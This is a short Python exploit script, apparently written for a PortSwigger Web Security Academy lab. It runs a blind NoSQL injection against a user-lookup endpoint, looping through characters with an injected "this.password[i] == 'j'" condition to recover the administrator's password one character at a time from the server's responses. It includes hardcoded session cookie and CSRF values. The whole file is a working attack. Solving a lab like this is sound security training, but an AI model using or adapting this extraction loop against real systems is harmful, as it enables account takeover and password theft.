import requests
import urllib.parse
import string
urltarget = 'https://0ac4008c040faf46819ad47b00ee005a.web-security-academy.net'

# Login
login_path = '/login'
login_header = {
    'Cookie': 'session=1SnGS4vJaIl89uAb5nF4AEKg1gU2mDu1',       # Change this
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-length': '68'
}
login_data = {
    'csrf': 'UYJJd27WeBrDM1uSuTHYTN8By838zDgz',                 # Change this
    'username': 'wiener',
    'password': 'peter'
}
# log_r = requests.post(url=urltarget+login_path, data=login_data, headers=login_header)
# print(log_r.text)

# Exploit
exploit_path = '/user/lookup?user='
admin_pwd = ''
for i in range(0, 8):
    for j in string.ascii_lowercase:
        print(f'[!] Loop {i} with char {j}...')
        payload = urllib.parse.quote(f"administrator' && this.password[{i}] == '{j}")
        # print(f'[+] Payload: {payload}')
        r = requests.get(url=urltarget+exploit_path+payload, headers=login_header)
        # print(r.text)
        if('Could not find user' not in r.text):
            admin_pwd += j
            break
print(f"[+] Admin's password: {admin_pwd}")